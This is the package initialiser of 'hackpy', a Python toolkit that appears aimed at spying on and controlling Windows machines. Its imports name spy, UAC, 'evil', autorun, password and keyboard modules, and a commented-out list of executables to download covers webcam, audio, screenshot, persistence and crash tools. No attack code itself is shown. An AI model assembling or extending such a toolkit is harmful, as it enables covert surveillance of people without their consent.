logo = (r"""
	_  _     _   _                  _        ____
  _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
 |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
 |_      _| |  _  | | (_| | | (__  |   <    |  __/  | |_| |
   |_||_|   |_| |_|  \__,_|  \___| |_|\_\   |_|      \__, |
		 Module Created by L1merBoy with Love <3     |___/
""")

# Import hackpy modules
from hackpy.spy         import *
from hackpy.uac         import *
from hackpy.evil        import *
from hackpy.info        import *
from hackpy.file        import *
from hackpy.power       import *
from hackpy.admin       import *
from hackpy.python      import *
from hackpy.autorun     import *
from hackpy.modules     import *
from hackpy.network     import *
from hackpy.commands    import *
from hackpy.settings    import *
#from hackpy.keyboard   import *
from hackpy.clipboard   import *
from hackpy.activity    import *
#from hackpy.passwords  import *
from hackpy.protection  import *
from hackpy.messagebox  import *
from hackpy.taskmanager import *

# Create hackpy folders
for folder in ['', 'executable', 'tempdata']:
	if not file.exists(main_path + folder):
		file.mkdir(main_path + folder)

# Clean temp folder
for temp in file.scan(temp_path):
	try:
		file.remove(temp_path + temp)
	except:
		pass
		
# Load all modules

# Selected files will be downloaded to your computer automatically when function 'load_modules(..)' is launched.
# To do this, you need an Internet connection.
# load_modules(
# 	'autorun.exe',  # Size: 5.50 KB | Need for hackpy.autorun(file).install(),  hackpy.autorun(file).uninstall()
# 	'webcam.exe',   # Size: 64.5 KB | Need for hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
# 	'nircmd.exe',   # Size: 44.5 KB | Need for hackpy.desktopScreenshot(), hackpy.command.nircmdc()
# 	'bsod.exe',     # Size: 5.00 KB | Need for hackpy.bsod()
# 	'activity.exe', # Size: 6.50 KB | Need for hackpy.getActiveWindow(), hackpy.userIsActive(), hackpy.setCursorPos(x,y), hackpy.getCursorPos()
# 	'audio.zip'     # Size: 665  KB | Need for hackpy.recordAudio(filename = 'recording.wav', time = 20)
# )

if __name__ == '__main__':
	print(logo)